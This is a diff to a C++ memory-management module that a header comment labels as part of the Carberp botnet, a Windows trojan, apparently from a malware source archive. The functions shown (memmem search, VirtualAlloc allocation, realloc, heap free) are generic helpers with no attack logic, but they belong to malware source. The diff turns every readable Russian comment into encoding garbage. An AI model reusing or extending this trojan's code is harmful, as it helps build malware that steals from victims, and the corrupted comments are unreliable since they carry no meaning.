@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "Memory.h"
 #include "GetApi.h"
 
@@ -83,7 +94,7 @@ void* m_memmem( const void* mem1, int szMem1, const void* mem2, int szMem2 )
 					break;
 				else
 					i++;
-			if( i >= szMem2 ) //совпало
+			if( i >= szMem2 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				return (void*)p1;
 		}
 		p1++;
@@ -118,7 +129,7 @@ LPVOID MemAlloc( DWORD dwSize )
 
 LPVOID MemAllocAndClear(size_t Size)
 {
-	// Выделить и очистить память указанного размера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Size == 0) return NULL;
 	LPVOID Memory = pVirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	m_memset(Memory, 0, Size);
@@ -130,21 +141,21 @@ LPVOID MemAllocAndClear(size_t Size)
 
 LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
 {
-    // Изменяем размер выделенного буфера памяти
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD PrevLen = 0;
 
-	// Определяем размер предыдущего блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if ( lpAddr )
 		PrevLen = GetMemSize(lpAddr);
 
-	//  Создаём новый буфер
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPVOID NewAddr = NULL;
 	if (dwSize > 0)
 	{
 		NewAddr = MemAlloc(dwSize);
 		if (lpAddr && NewAddr && PrevLen)
 		{
-            // Копируем старую память
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (dwSize < PrevLen)
             	PrevLen = dwSize;
 			m_memcpy(NewAddr, lpAddr, PrevLen);
@@ -170,7 +181,7 @@ LPVOID HEAP::Alloc(DWORD Size)
 
 LPVOID HEAP::ReAlloc(LPVOID Buf, DWORD Size)
 {
-	// Переопределяем блок памяти
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Buf == NULL)
 		return HEAP::Alloc(Size);
@@ -199,7 +210,7 @@ bool HEAP::ReAlloc2(LPVOID &Buf, DWORD Size)
 
 void HEAP::Free(LPVOID Buf)
 {
-	// Освобождаем выделенную память
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Buf == NULL) return;
 
@@ -210,7 +221,7 @@ void HEAP::Free(LPVOID Buf)
 
 void HEAP::Free2(LPVOID &Buf)
 {
-	// Освободить память и обнулить переменную
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf != NULL)
 	{
 		HEAP::Free(Buf);
